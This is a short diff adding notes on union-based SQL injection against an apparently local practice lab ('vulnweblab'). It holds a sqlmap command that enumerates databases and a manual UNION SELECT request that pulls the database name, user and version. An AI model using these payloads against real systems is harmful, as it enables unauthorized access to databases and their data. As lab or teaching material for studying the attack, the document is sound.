@@ -1,0 +1,9 @@
+SQL Injection (Union-Based)
+
+bash
+# sqlmap one-liner
+sqlmap -u "http://localhost/vulnweblab/sqli/low.php?id=1" --dbs --batch
+
+# Manual payload
+GET /sqli/low.php?id=1'+UNION+SELECT+1,database(),user(),version()--+ HTTP/1.1
+
